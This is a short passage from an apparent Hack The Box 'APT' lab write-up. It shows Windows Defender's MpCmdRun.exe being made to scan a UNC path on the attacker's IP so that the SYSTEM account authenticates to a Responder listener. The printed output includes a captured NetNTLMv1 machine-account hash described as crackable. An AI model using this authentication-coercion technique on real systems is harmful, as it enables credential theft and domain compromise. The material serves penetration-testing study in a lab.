# Defender
When running mpscan, defender uses the SYSTEM user, in this case its APT$. If scanning a UNC path we can force system to authenticate to us, which is patched on latest windows. Due to LMCopatibilityLevel being 2 ,  NetNTLMv1 can be used which allows cracking of the hash.

```Bash
*Evil-WinRM* PS C:\Program Files\Windows Defender> .\MpCmdRun.exe -Scan -ScanType 3 -File \\10.10.14.23\Please\test$
Scan starting...$    
CmdTool: Failed with hr = 0x80508023. Check C:\Users\HENRY~2.VIN\AppData\Local\Temp\MpCmdRun.log for more information$
```
```Bash
┌─[user@parrot-virtual]─[~/htb/apt]$
└──╼ $sudo responder -I tun0 --lm$
                                         __$
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.$
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|$
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|$
                   |__|$
$
           NBT-NS, LLMNR & MDNS Responder 3.0.2.0$
[+] Generic Options:$
    Responder NIC              [tun0]$
    Responder IP               [10.10.14.23]$
    Challenge set              [1122334455667788]$
    Don't Respond To Names     ['ISATAP']$
$
[+] Listening for events...$
[SMB] NTLMv1 Client   : 10.10.10.213$
[SMB] NTLMv1 Username : HTB\APT$$
[SMB] NTLMv1 Hash     : APT$::HTB:95ACA8C7248774CB427E1AE5B8D5CE6830A49B5BB858D384:95ACA8C7248774CB427E1AE5B8D5CE6830A49B5BB858D384:1122334455667788$
[*] Skipping previously captured hash for HTB\APT$$
[*] Skipping previously captured hash for HTB\APT$$
[*] Skipping previously captured hash for HTB\APT$$
[*] Skipping previously captured hash for HTB\APT$$
```